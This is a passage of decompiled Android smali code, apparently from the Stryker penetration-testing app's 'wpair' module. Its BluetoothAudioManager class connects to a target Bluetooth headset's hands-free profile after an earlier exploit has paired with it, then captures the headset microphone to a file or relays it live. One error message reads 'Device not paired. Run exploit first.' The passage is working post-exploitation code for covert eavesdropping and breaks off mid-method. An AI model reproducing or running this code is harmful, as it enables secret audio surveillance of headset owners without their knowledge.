    const-string v1, "android.bluetooth.headset.profile.action.CONNECTION_STATE_CHANGED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "android.bluetooth.headset.profile.action.AUDIO_STATE_CHANGED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->context:Landroid/content/Context;

    iget-object v2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->scoReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v1, v2, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    return-void
.end method

.method private routeRecordToScoInput(Landroid/media/AudioRecord;)V
    .locals 6

    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioManager:Landroid/media/AudioManager;

    if-nez v0, :cond_0

    return-void

    :cond_0
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/media/AudioManager;->getDevices(I)[Landroid/media/AudioDeviceInfo;

    move-result-object v0

    array-length v1, v0

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v1, :cond_2

    aget-object v3, v0, v2

    invoke-virtual {v3}, Landroid/media/AudioDeviceInfo;->getType()I

    move-result v4

    const/4 v5, 0x7

    if-ne v4, v5, :cond_1

    invoke-virtual {p1, v3}, Landroid/media/AudioRecord;->setPreferredDevice(Landroid/media/AudioDeviceInfo;)Z

    return-void

    :cond_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_2
    return-void
.end method

.method private safeStopListening()V
    .locals 6

    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->lock:Ljava/lang/Object;

    monitor-enter v0

    :try_start_0
    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioTrack:Landroid/media/AudioTrack;

    const/4 v2, 0x0

    iput-object v2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioTrack:Landroid/media/AudioTrack;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/4 v3, 0x3

    const/4 v4, 0x1

    if-eqz v1, :cond_1

    :try_start_1
    invoke-virtual {v1}, Landroid/media/AudioTrack;->getState()I

    move-result v5

    if-ne v5, v4, :cond_0

    invoke-virtual {v1}, Landroid/media/AudioTrack;->getPlayState()I

    move-result v5

    if-ne v5, v3, :cond_0

    invoke-virtual {v1}, Landroid/media/AudioTrack;->stop()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v1

    goto :goto_1

    :catch_0
    :cond_0
    :goto_0
    :try_start_2
    invoke-virtual {v1}, Landroid/media/AudioTrack;->release()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :catch_1
    :cond_1
    :try_start_3
    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioRecord:Landroid/media/AudioRecord;

    iput-object v2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioRecord:Landroid/media/AudioRecord;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    if-eqz v1, :cond_3

    :try_start_4
    invoke-virtual {v1}, Landroid/media/AudioRecord;->getState()I

    move-result v2

    if-ne v2, v4, :cond_2

    invoke-virtual {v1}, Landroid/media/AudioRecord;->getRecordingState()I

    move-result v2

    if-ne v2, v3, :cond_2

    invoke-virtual {v1}, Landroid/media/AudioRecord;->stop()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    :catch_2
    :cond_2
    :try_start_5
    invoke-virtual {v1}, Landroid/media/AudioRecord;->release()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :catch_3
    :cond_3
    :try_start_6
    monitor-exit v0

    return-void

    :goto_1
    monitor-exit v0
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    throw v1
.end method

.method private safeStopRecording()V
    .locals 4

    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->lock:Ljava/lang/Object;

    monitor-enter v0

    :try_start_0
    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioRecord:Landroid/media/AudioRecord;

    const/4 v2, 0x0

    iput-object v2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioRecord:Landroid/media/AudioRecord;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v1, :cond_1

    :try_start_1
    invoke-virtual {v1}, Landroid/media/AudioRecord;->getState()I

    move-result v2

    const/4 v3, 0x1

    if-ne v2, v3, :cond_0

    invoke-virtual {v1}, Landroid/media/AudioRecord;->getRecordingState()I

    move-result v2

    const/4 v3, 0x3

    if-ne v2, v3, :cond_0

    invoke-virtual {v1}, Landroid/media/AudioRecord;->stop()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v1

    goto :goto_1

    :catch_0
    :cond_0
    :goto_0
    :try_start_2
    invoke-virtual {v1}, Landroid/media/AudioRecord;->release()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :catch_1
    :cond_1
    :try_start_3
    monitor-exit v0

    return-void

    :goto_1
    monitor-exit v0
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    throw v1
.end method

.method private startAudioCapture(Ljava/io/File;Ljava/io/File;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V
    .locals 11
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    const-string v0, "Capture error: "

    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->lock:Ljava/lang/Object;

    monitor-enter v1

    const/16 v2, 0x3e80

    const/16 v3, 0x10

    const/4 v4, 0x2

    :try_start_0
    invoke-static {v2, v3, v4}, Landroid/media/AudioRecord;->getMinBufferSize(III)I

    move-result v2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/4 v3, -0x1

    if-eq v2, v3, :cond_2

    const/4 v3, -0x2

    if-ne v2, v3, :cond_0

    goto/16 :goto_2

    :cond_0
    mul-int/2addr v2, v4

    :try_start_1
    new-instance v3, Landroid/media/AudioRecord;

    const/4 v6, 0x7

    const/16 v7, 0x3e80

    const/16 v8, 0x10

    const/4 v9, 0x2

    move-object v5, v3

    move v10, v2

    invoke-direct/range {v5 .. v10}, Landroid/media/AudioRecord;-><init>(IIIII)V

    invoke-direct {p0, v3}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->routeRecordToScoInput(Landroid/media/AudioRecord;)V

    invoke-virtual {v3}, Landroid/media/AudioRecord;->getState()I

    move-result v4

    const/4 v5, 0x1

    if-eq v4, v5, :cond_1

    invoke-virtual {v3}, Landroid/media/AudioRecord;->release()V

    new-instance p1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    const-string p2, "AudioRecord init failed"

    invoke-direct {p1, p2}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    invoke-interface {p3, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    monitor-exit v1
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    return-void

    :catchall_0
    move-exception p1

    goto :goto_3

    :catch_0
    move-exception p1

    goto :goto_0

    :cond_1
    :try_start_3
    iput-object v3, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioRecord:Landroid/media/AudioRecord;

    iput-boolean v5, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->isRecording:Z

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    iput-wide v3, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->recordingStartTime:J

    sget-object v3, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Recording;->INSTANCE:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Recording;

    invoke-interface {p3, v3}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    new-instance v3, Ljava/lang/Thread;

    new-instance v4, Lcom/stryker/terminal/ui/other/l;

    const/4 v10, 0x3

    move-object v5, v4

    move-object v6, p0

    move-object v7, p1

    move-object v8, p2

    move v9, v2

    invoke-direct/range {v5 .. v10}, Lcom/stryker/terminal/ui/other/l;-><init>(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;II)V

    const-string p1, "WpairAudioRecorder"

    invoke-direct {v3, v4, p1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_1

    :goto_0
    :try_start_4
    const-string p2, "WpairAudio"

    const-string v2, "capture start failed"

    invoke-static {p2, v2, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    new-instance p2, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-direct {p2, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    invoke-interface {p3, p2}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    :goto_1
    monitor-exit v1

    return-void

    :cond_2
    :goto_2
    new-instance p1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    const-string p2, "Invalid buffer size"

    invoke-direct {p1, p2}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    invoke-interface {p3, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    monitor-exit v1

    return-void

    :goto_3
    monitor-exit v1
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    throw p1
.end method

.method private startAudioPassthrough(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V
    .locals 12
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->lock:Ljava/lang/Object;

    monitor-enter v0

    const/16 v1, 0x10

    const/16 v2, 0x3e80

    const/4 v3, 0x2

    :try_start_0
    invoke-static {v2, v1, v3}, Landroid/media/AudioRecord;->getMinBufferSize(III)I

    move-result v1

    const/4 v4, -0x1

    if-eq v1, v4, :cond_4

    const/4 v4, -0x2

    if-ne v1, v4, :cond_0

    goto/16 :goto_4

    :cond_0
    mul-int/2addr v1, v3

    iget-object v4, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioManager:Landroid/media/AudioManager;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :try_start_1
    new-instance v11, Landroid/media/AudioRecord;

    const/4 v6, 0x7

    const/16 v7, 0x3e80

    const/16 v8, 0x10

    const/4 v9, 0x2

    move-object v5, v11

    move v10, v1

    invoke-direct/range {v5 .. v10}, Landroid/media/AudioRecord;-><init>(IIIII)V

    invoke-direct {p0, v11}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->routeRecordToScoInput(Landroid/media/AudioRecord;)V

    invoke-virtual {v11}, Landroid/media/AudioRecord;->getState()I

    move-result v5

    const/4 v6, 0x1

    if-eq v5, v6, :cond_1

    invoke-virtual {v11}, Landroid/media/AudioRecord;->release()V

    new-instance v1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    const-string v2, "AudioRecord init failed"

    invoke-direct {v1, v2}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    invoke-interface {p1, v1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    monitor-exit v0
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    return-void

    :catchall_0
    move-exception p1

    goto/16 :goto_5

    :catch_0
    move-exception v1

    goto/16 :goto_2

    :cond_1
    const/4 v5, 0x4

    :try_start_3
    invoke-static {v2, v5, v3}, Landroid/media/AudioTrack;->getMinBufferSize(III)I

    move-result v7

    mul-int/2addr v7, v3

    new-instance v8, Landroid/media/AudioTrack$Builder;

    invoke-direct {v8}, Landroid/media/AudioTrack$Builder;-><init>()V

    new-instance v9, Landroid/media/AudioAttributes$Builder;

    invoke-direct {v9}, Landroid/media/AudioAttributes$Builder;-><init>()V

    invoke-virtual {v9, v6}, Landroid/media/AudioAttributes$Builder;->setUsage(I)Landroid/media/AudioAttributes$Builder;

    move-result-object v9

    invoke-virtual {v9, v3}, Landroid/media/AudioAttributes$Builder;->setContentType(I)Landroid/media/AudioAttributes$Builder;

    move-result-object v9

    invoke-virtual {v9}, Landroid/media/AudioAttributes$Builder;->build()Landroid/media/AudioAttributes;

    move-result-object v9

    invoke-virtual {v8, v9}, Landroid/media/AudioTrack$Builder;->setAudioAttributes(Landroid/media/AudioAttributes;)Landroid/media/AudioTrack$Builder;

    move-result-object v8

    new-instance v9, Landroid/media/AudioFormat$Builder;

    invoke-direct {v9}, Landroid/media/AudioFormat$Builder;-><init>()V

    invoke-virtual {v9, v3}, Landroid/media/AudioFormat$Builder;->setEncoding(I)Landroid/media/AudioFormat$Builder;

    move-result-object v9

    invoke-virtual {v9, v2}, Landroid/media/AudioFormat$Builder;->setSampleRate(I)Landroid/media/AudioFormat$Builder;

    move-result-object v2

    invoke-virtual {v2, v5}, Landroid/media/AudioFormat$Builder;->setChannelMask(I)Landroid/media/AudioFormat$Builder;

    move-result-object v2

    invoke-virtual {v2}, Landroid/media/AudioFormat$Builder;->build()Landroid/media/AudioFormat;

    move-result-object v2

    invoke-virtual {v8, v2}, Landroid/media/AudioTrack$Builder;->setAudioFormat(Landroid/media/AudioFormat;)Landroid/media/AudioTrack$Builder;

    move-result-object v2

    invoke-virtual {v2, v7}, Landroid/media/AudioTrack$Builder;->setBufferSizeInBytes(I)Landroid/media/AudioTrack$Builder;

    move-result-object v2

    invoke-virtual {v2, v6}, Landroid/media/AudioTrack$Builder;->setTransferMode(I)Landroid/media/AudioTrack$Builder;

    move-result-object v2

    invoke-virtual {v2}, Landroid/media/AudioTrack$Builder;->build()Landroid/media/AudioTrack;

    move-result-object v2

    if-eqz v4, :cond_3

    invoke-virtual {v4, v3}, Landroid/media/AudioManager;->getDevices(I)[Landroid/media/AudioDeviceInfo;

    move-result-object v4

    array-length v5, v4

    const/4 v7, 0x0

    :goto_0
    if-ge v7, v5, :cond_3

    aget-object v8, v4, v7

    invoke-virtual {v8}, Landroid/media/AudioDeviceInfo;->getType()I

    move-result v9

    if-ne v9, v3, :cond_2

    invoke-virtual {v2, v8}, Landroid/media/AudioTrack;->setPreferredDevice(Landroid/media/AudioDeviceInfo;)Z

    goto :goto_1

    :cond_2
    add-int/lit8 v7, v7, 0x1

    goto :goto_0

    :cond_3
    :goto_1
    iput-object v11, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioRecord:Landroid/media/AudioRecord;

    iput-object v2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioTrack:Landroid/media/AudioTrack;

    iput-boolean v6, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->isListening:Z

    sget-object v2, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Listening;->INSTANCE:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Listening;

    invoke-interface {p1, v2}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Ly/n;

    const/16 v4, 0x9

    invoke-direct {v3, v1, v4, p0}, Ly/n;-><init>(IILjava/lang/Object;)V

    const-string v1, "WpairAudioPassthrough"

    invoke-direct {v2, v3, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_3

    :goto_2
    :try_start_4
    const-string v2, "WpairAudio"

    const-string v3, "passthrough start failed"

    invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    new-instance v2, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Passthrough error: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v2, v1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    invoke-interface {p1, v2}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    :goto_3
    monitor-exit v0

    return-void

    :cond_4
    :goto_4
    new-instance v1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    const-string v2, "Invalid buffer size"

    invoke-direct {v1, v2}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    invoke-interface {p1, v1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    monitor-exit v0

    return-void

    :goto_5
    monitor-exit v0
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    throw p1
.end method

.method private startSco(Landroid/media/AudioManager;)V
    .locals 4
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1f

    if-lt v0, v1, :cond_1

    invoke-static {p1}, Landroidx/core/view/d;->g(Landroid/media/AudioManager;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/media/AudioDeviceInfo;

    invoke-virtual {v1}, Landroid/media/AudioDeviceInfo;->getType()I

    move-result v2

    const/4 v3, 0x7

    if-ne v2, v3, :cond_0

    invoke-static {p1, v1}, Landroidx/core/view/d;->k(Landroid/media/AudioManager;Landroid/media/AudioDeviceInfo;)V

    return-void

    :cond_1
    invoke-virtual {p1}, Landroid/media/AudioManager;->startBluetoothSco()V

    const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/media/AudioManager;->setBluetoothScoOn(Z)V

    :cond_2
    return-void
.end method

.method private unregisterScoReceiver()V
    .locals 2

    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->scoReceiver:Landroid/content/BroadcastReceiver;

    if-nez v0, :cond_0

    return-void

    :cond_0
    :try_start_0
    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->context:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->scoReceiver:Landroid/content/BroadcastReceiver;

    return-void
.end method


# virtual methods
.method public connectAudioProfile(Ljava/lang/String;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V
    .locals 8
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    .line 1
    const-string v0, "HFP_PERMISSION_DENIED"

    .line 2
    .line 3
    const-string v1, "HFP_MANUAL_REQUIRED"

    .line 4
    .line 5
    iput-object p2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->stateCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;

    .line 6
    .line 7
    sget-object v2, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Connecting;->INSTANCE:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Connecting;

    .line 8
    .line 9
    invoke-interface {p2, v2}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    .line 10
    .line 11
    .line 12
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->adapter()Landroid/bluetooth/BluetoothAdapter;

    .line 13
    .line 14
    .line 15
    move-result-object v2

    .line 16
    iget-object v3, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->headsetProfile:Landroid/bluetooth/BluetoothHeadset;

    .line 17
    .line 18
    if-eqz v2, :cond_5

    .line 19
    .line 20
    if-nez v3, :cond_0

    .line 21
    .line 22
    goto/16 :goto_4

    .line 23
    .line 24
    :cond_0
    :try_start_0
    invoke-virtual {v2, p1}, Landroid/bluetooth/BluetoothAdapter;->getRemoteDevice(Ljava/lang/String;)Landroid/bluetooth/BluetoothDevice;

    .line 25
    .line 26
    .line 27
    move-result-object p1

    .line 28
    iput-object p1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->targetDevice:Landroid/bluetooth/BluetoothDevice;

    .line 29
    .line 30
    invoke-virtual {v3}, Landroid/bluetooth/BluetoothHeadset;->getConnectedDevices()Ljava/util/List;

    .line 31
    .line 32
    .line 33
    move-result-object v2

    .line 34
    invoke-interface {v2, p1}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    .line 35
    .line 36
    .line 37
    move-result v2

    .line 38
    if-eqz v2, :cond_1

    .line 39
    .line 40
    sget-object p1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Connected;->INSTANCE:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Connected;

    .line 41
    .line 42
    invoke-interface {p2, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    .line 43
    .line 44
    .line 45
    return-void

    .line 46
    :catch_0
    move-exception p1

    .line 47
    goto/16 :goto_2

    .line 48
    .line 49
    :cond_1
    invoke-virtual {p1}, Landroid/bluetooth/BluetoothDevice;->getBondState()I

    .line 50
    .line 51
    .line 52
    move-result v2

    .line 53
    const/16 v4, 0xc

    .line 54
    .line 55
    if-eq v2, v4, :cond_2

    .line 56
    .line 57
    new-instance p1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    .line 58
    .line 59
    const-string v0, "Device not paired. Run exploit first."

    .line 60
    .line 61
    invoke-direct {p1, v0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    .line 62
    .line 63
    .line 64
    invoke-interface {p2, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 65
    .line 66
    .line 67
    return-void

    .line 68
    :cond_2
    :try_start_1
    const-class v2, Landroid/bluetooth/BluetoothHeadset;

    .line 69
    .line 70
    const-string v4, "connect"

    .line 71
    .line 72
    const/4 v5, 0x1

    .line 73
    new-array v5, v5, [Ljava/lang/Class;

    .line 74
    .line 75
    const-class v6, Landroid/bluetooth/BluetoothDevice;

    .line 76
    .line 77
    const/4 v7, 0x0

    .line 78
    aput-object v6, v5, v7

    .line 79
    .line 80
    invoke-virtual {v2, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    .line 81
    .line 82
    .line 83
    move-result-object v2

    .line 84
    filled-new-array {p1}, [Ljava/lang/Object;

    .line 85
    .line 86
    .line 87
    move-result-object v4

    .line 88
    invoke-virtual {v2, v3, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 89
    .line 90
    .line 91
    move-result-object v2

    .line 92
    instance-of v4, v2, Ljava/lang/Boolean;

    .line 93
    .line 94
    if-eqz v4, :cond_3

    .line 95
    .line 96
    check-cast v2, Ljava/lang/Boolean;

    .line 97
    .line 98
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    .line 99
    .line 100
    .line 101
    move-result v2

    .line 102
    if-eqz v2, :cond_3

    .line 103
    .line 104
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->registerScoReceiver()V

    .line 105
    .line 106
    .line 107
    iget-object v2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->handler:Landroid/os/Handler;

    .line 108
    .line 109
    new-instance v4, Lv3/g;

    .line 110
    .line 111
    const/16 v5, 0x1a

    .line 112
    .line 113
    invoke-direct {v4, v3, p1, p2, v5}, Lv3/g;-><init>(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;I)V

    .line 114
    .line 115
    .line 116
    const-wide/16 v5, 0x1388

    .line 117
    .line 118
    invoke-virtual {v2, v4, v5, v6}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 119
    .line 120
    .line 121
    goto :goto_3

    .line 122
    :catch_1
    move-exception p1

    .line 123
    goto :goto_1

    .line 124
    :cond_3
    new-instance p1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    .line 125
    .line 126
    invoke-direct {p1, v1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    .line 127
    .line 128
    .line 129
    invoke-interface {p2, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V
    :try_end_1
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/SecurityException; {:try_start_1 .. :try_end_1} :catch_3
    .catch Ljava/lang/NoSuchMethodException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 130
    .line 131
    .line 132
    goto :goto_3

    .line 133
    :catch_2
    :try_start_2
    new-instance p1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    .line 134
    .line 135
    invoke-direct {p1, v1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    .line 136
    .line 137
    .line 138
    :goto_0
